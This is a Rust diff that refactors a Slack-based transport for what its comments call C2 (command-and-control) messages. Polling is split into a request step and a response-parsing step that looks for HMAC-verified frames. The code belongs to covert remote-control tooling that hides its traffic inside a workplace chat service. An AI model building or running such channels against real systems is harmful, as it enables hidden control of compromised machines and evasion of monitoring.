@@ -207,6 +207,13 @@ impl SlackTransport {
     /// Poll Slack history for new messages. Returns `Ok(Some(frame))` if a new
     /// C2 message was found, `Ok(None)` if nothing new, or `Err` on failure.
     fn poll_history(&mut self) -> Result<Option<Vec<u8>>, TransportError> {
+        let payload = self.fetch_history()?;
+        Ok(self.scan_history_for_frame(&payload))
+    }
+
+    /// Fetch the channel history page since the last seen timestamp (request
+    /// construction).
+    fn fetch_history(&self) -> Result<HistoryPayload, TransportError> {
         let mut params = vec![("channel", self.channel_id.as_str()), ("limit", "5")];
         let oldest_str;
         if let Some(ref ts) = self.last_ts {
@@ -218,7 +225,12 @@ impl SlackTransport {
         let payload: HistoryPayload = resp
             .into_json()
             .map_err(|_| TransportError::Transient("Slack history parse error"))?;
+        Ok(payload)
+    }
 
+    /// Scan a fetched history page for the first valid C2 frame and advance
+    /// the recv cursor (response parsing).
+    fn scan_history_for_frame(&mut self, payload: &HistoryPayload) -> Option<Vec<u8>> {
         // Find the first message that is NOT from our own bot AND carries a
         // valid HMAC tag. Any message whose tag doesn't verify (a human, another
         // bot, an admin pasting a base64 blob) is skipped without being decoded —
@@ -247,7 +259,7 @@ impl SlackTransport {
 
             // Advance the cursor only once we've accepted a frame.
             self.last_ts = Some(msg.ts.clone());
-            return Ok(Some(frame));
+            return Some(frame);
         }
 
         // Update cursor to the latest message timestamp even if we didn't find
@@ -256,7 +268,7 @@ impl SlackTransport {
             self.last_ts = Some(latest.ts.clone());
         }
 
-        Ok(None)
+        None
     }
 
     /// Enforce send rate limit (1.2 s between messages).
